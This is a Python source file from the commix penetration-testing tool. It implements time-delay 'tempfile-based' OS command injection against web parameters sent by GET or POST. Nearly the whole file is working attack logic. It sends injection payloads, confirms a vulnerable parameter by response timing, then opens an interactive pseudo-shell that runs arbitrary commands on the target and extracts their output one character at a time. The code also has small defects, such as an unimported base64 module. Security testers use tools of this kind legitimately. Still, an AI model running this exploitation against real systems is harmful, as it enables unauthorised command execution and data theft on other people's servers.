#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.semiblind_based.techniques.payloads import tempfile_based_payloads

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

def exploitation(url,delay,filename,tmp_path,http_request_method):
  
  counter = 0
  vp_flag = True
  no_result = True
  is_encoded= False
  injection_type = "Semiblind-based Command Injection"
  technique = "tempfile-based injection technique"
  
  # Print the findings to log file.
  output_file = open(filename + ".txt", "a")
  output_file.write("\n---")
  output_file.write("\n(+) Type : " + injection_type)
  output_file.write("\n(+) Technique : " + technique.title())
  output_file.close()
    
  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = menu.options.maxlen
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print colors.RED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + colors.RESET

  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET)
  sys.stdout.flush()

  for seperator in settings.SEPERATORS:
	    
    # Change TAG on every request to prevent false-positive resutls.
    TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
    
    # Check if defined "--base64" option.
    if menu.options.base64_trick == True:
      B64_ENC_TAG = base64.b64encode(TAG)
      B64_DEC_TRICK = settings.B64_DEC_TRICK
    else:
      B64_ENC_TAG = TAG
      B64_DEC_TRICK = ""
      
    # The output file for file-based injection technique.
    OUTPUT_TEXTFILE = tmp_path + B64_ENC_TAG + ".txt"
    alter_shell = menu.options.alter_shell
    tag_length = len(TAG) + 4
    for j in range(1,int(tag_length)):
      
      try:
	
	# Tempfile-based decision payload (check if host is vulnerable).
	if not alter_shell :
	  payload = tempfile_based_payloads.decision(seperator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method)
	  
	else:
	  payload = tempfile_based_payloads.decision_alter_shell(seperator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method)

	# Check if defined "--verbose" option.
	if menu.options.verbose:
	  if seperator == ";" or seperator == "&&" or seperator == "||":
	    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)

	start = 0
	end = 0
	start = time.time()
	
	# Check if defined method is GET (Default).
	if http_request_method == "GET":
	  
	  # Check if its not specified the 'INJECT_HERE' tag
	  url = parameters.do_GET_check(url)
	  
	  # Encoding non-ASCII characters payload.
	  payload = urllib.quote(payload)
	  
	  # Define the vulnerable parameter
	  vuln_parameter = parameters.vuln_GET_param(url)
	    
	  target = re.sub(settings.INJECT_TAG, payload, url)
	  request = urllib2.Request(target)
	  
	  # Check if defined extra headers.
	  headers.do_check(request)
	  
	  # Check if defined any HTTP Proxy.
	  if menu.options.proxy:
	    try:
	      proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	      opener = urllib2.build_opener(proxy)
	      urllib2.install_opener(opener)
	      response = urllib2.urlopen(request)
	      response.read()
	      
	    except urllib2.HTTPError, err:
	      print "\n(x) Error : " + str(err)
	      sys.exit(1) 
      
	  else:
	    response = urllib2.urlopen(request)
	    response.read()
	    
	# Check if defined method is POST.
	else:
	  
	  parameter = menu.options.data
	  parameter = urllib2.unquote(parameter)
	  
	  # Check if its not specified the 'INJECT_HERE' tag
	  parameter = parameters.do_POST_check(parameter)

	  # Define the POST data
	  data = re.sub(settings.INJECT_TAG, payload, parameter)
	  request = urllib2.Request(url, data)
	  
	  # Check if defined extra headers.
	  headers.do_check(request)
	  
	  # Define the vulnerable parameter
	  vuln_parameter = parameters.vuln_POST_param(parameter,url)
	  
	  # Check if defined any HTTP Proxy.
	  if menu.options.proxy:
	    try:
	      proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	      opener = urllib2.build_opener(proxy)
	      urllib2.install_opener(opener)
	      response = urllib2.urlopen(request)
	      response.read()
	      
	    except urllib2.HTTPError, err:
	      print "\n(x) Error : " + str(err)
	      sys.exit(1) 
      
	  else:
	    response = urllib2.urlopen(request)
	    response.read()
		
	end  = time.time()
	how_long = int(end - start)

      except:
	continue
	
      if how_long == delay:
	found = True
	no_result = False
	
	if http_request_method == "GET":
	    
	  # Print the findings to log file
	  if vp_flag == True:
	    output_file = open(filename + ".txt", "a")
	    output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	    output_file.write("\n---\n")
	    vp_flag = False
	    output_file.close()
	    
	  counter = counter + 1
	  output_file = open(filename + ".txt", "a")
	  output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	  output_file.close()
	    
	  # Print the findings to terminal.
	  print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	  print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	  print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	  print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	  print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", urllib.unquote_plus(payload)) + colors.RESET + "\n"
	    
	else :
	  
	  # Print the findings to log file
	  if vp_flag == True:
	    output_file = open(filename + ".txt", "a")
	    output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	    output_file.write("\n---\n")
	    vp_flag = False
	    output_file.close()
	    
	  counter = counter + 1
	  output_file = open(filename + ".txt", "a")
	  output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	  output_file.close()
	    
	  # Print the findings to terminal.
	  print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	  print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	  print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	  print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	  print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
	    
	gotshell = raw_input("(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
	if gotshell == "Y" or gotshell == "y":
	  print ""
	  print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
	  while True:
	    try:
	      cmd = raw_input("Shell > ")
	      if cmd == "q":
		sys.exit(0)
		
	      else:
		print "\n(*) Retrieving the length of execution output..."
		for j in range(1,int(maxlen)):
		  
		  # Execute shell commands on vulnerable host.
		  if not alter_shell :
		    payload = tempfile_based_payloads.cmd_execution(seperator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method)
		  else:
		    payload = tempfile_based_payloads.cmd_execution_alter_shell(seperator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method)

		  # Check if defined "--verbose" option.
		  if menu.options.verbose:
		    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
		    
		  start = 0
		  end = 0
		  start = time.time()
		  
		  # Check if defined method is GET (Default).
		  if http_request_method == "GET":
		    
		    payload = urllib.quote(payload)
		    
		    # Check if its not specified the 'INJECT_HERE' tag
		    url = parameters.do_GET_check(url)
		    
		    target = re.sub(settings.INJECT_TAG, payload, url)
		    vuln_parameter = ''.join(vuln_parameter)
		    
		    #print target
		    request = urllib2.Request(target)
		
		    # Check if defined extra headers.
		    headers.do_check(request)
				    
		    # Check if defined any HTTP Proxy.
		    if menu.options.proxy:
		      try:
			proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
			opener = urllib2.build_opener(proxy)
			urllib2.install_opener(opener)
			response = urllib2.urlopen(request)
			response.read()
			
		      except urllib2.HTTPError, err:
			print "\n(x) Error : " + str(err)
			sys.exit(1) 
		
		    else:
		      response = urllib2.urlopen(request)
		      response.read()
		      
		  # Check if defined method is POST.
		  else :
		    parameter = menu.options.data
		    parameter = urllib2.unquote(parameter)
		    
		    # Check if its not specified the 'INJECT_HERE' tag
		    parameter = parameters.do_POST_check(parameter)
		    
		    data = re.sub(settings.INJECT_TAG, payload, parameter)
		    request = urllib2.Request(url, data)
		    
		    # Check if defined extra headers.
		    headers.do_check(request)
	      
		    # Check if defined any HTTP Proxy.
		    if menu.options.proxy:
		      try:
			proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
			opener = urllib2.build_opener(proxy)
			urllib2.install_opener(opener)
			response = urllib2.urlopen(request)
			response.read()
			
		      except urllib2.HTTPError, err:
			print "\n(x) Error : " + str(err)
			sys.exit(1) 
		
		    else:
		      response = urllib2.urlopen(request)
		      response.read()
		      
		  end  = time.time()
		  how_long = int(end - start)
		  
		  if how_long == delay:
		    if menu.options.verbose:
		      print "\n"
		    print colors.BOLD + "(!) Retrieved " + str(j) + " characters."+ colors.RESET
		    break
			    
		i = j + 1
		print "(*) Grabbing the output from '" + OUTPUT_TEXTFILE + "'... (This will take a while!) \n"
		check_start = 0
		check_end = 0
		check_start = time.time()
		
		output = []
		for i in range(1,int(i)):
		  for ascii_char in range(32, 129):
		    
		    # Get the execution ouput, of shell execution.
		    if not alter_shell :
		      payload = tempfile_based_payloads.get_char(seperator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method)
		    else:
		      payload = tempfile_based_payloads.get_char_alter_shell(seperator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method)
		      
		    # Check if defined "--verbose" option.
		    if menu.options.verbose:
		      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
		      
		    start = 0
		    end = 0
		    start = time.time()
		    
		    if http_request_method == "GET":
		      payload = urllib.quote(payload)
		      target = re.sub(settings.INJECT_TAG, payload, url)
		      vuln_parameter = ''.join(vuln_parameter)
		      request = urllib2.Request(target)
		      
		      # Check if defined extra headers.
		      headers.do_check(request)
			
		      # Check if defined any HTTP Proxy.
		      if menu.options.proxy:
			try:
			  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
			  opener = urllib2.build_opener(proxy)
			  urllib2.install_opener(opener)
			  response = urllib2.urlopen(request)
			  response.read()
			  
			except urllib2.HTTPError, err:
			  print "\n(x) Error : " + str(err)
			  sys.exit(1) 
		  
		      else:
			response = urllib2.urlopen(request)
			response.read()
			
		    else :
		      
		      parameter = urllib2.unquote(parameter)
		      data = re.sub(settings.INJECT_TAG, payload, parameter)
		      request = urllib2.Request(url, data)
		      
		      # Check if defined extra headers.
		      headers.do_check(request)
			
		      # Check if defined any HTTP Proxy.
		      if menu.options.proxy:
			try:
			  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
			  opener = urllib2.build_opener(proxy)
			  urllib2.install_opener(opener)
			  response = urllib2.urlopen(request)
			  response.read()
			  
			except urllib2.HTTPError, err:
			  print "\n(x) Error : " + str(err)
			  sys.exit(1) 
		  
		      else:
			response = urllib2.urlopen(request)
			response.read()
			
		    end  = time.time()
		    how_long = int(end - start)

		    if how_long == delay:
		      
		      if menu.options.verbose:
			
			output.append(chr(ascii_char))
			break
		      
		      else:
			sys.stdout.write(colors.GREEN + colors.BOLD + chr(ascii_char) + colors.RESET)
			sys.stdout.flush()
			break
		    
		check_end  = time.time()
		check_how_long = int(check_end - check_start)
		
		# Check if defined "--verbose" option.
		if menu.options.verbose:
		  output = "".join(str(p) for p in output)
		  print "\n\n" + colors.GREEN + colors.BOLD + output + colors.RESET
		print "\n\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
		
	    except KeyboardInterrupt: 
	      print ""
	      sys.exit(1)

	else:
	  print "(*) Continue testing the "+ technique +"... "
	  break
      
  if no_result == True:
    if menu.options.verbose == False:
      print "[" + colors.RED + " FAILED "+colors.RESET+"]"
      return False
  
    else:
      print ""
      return False
  
  else :
    print ""
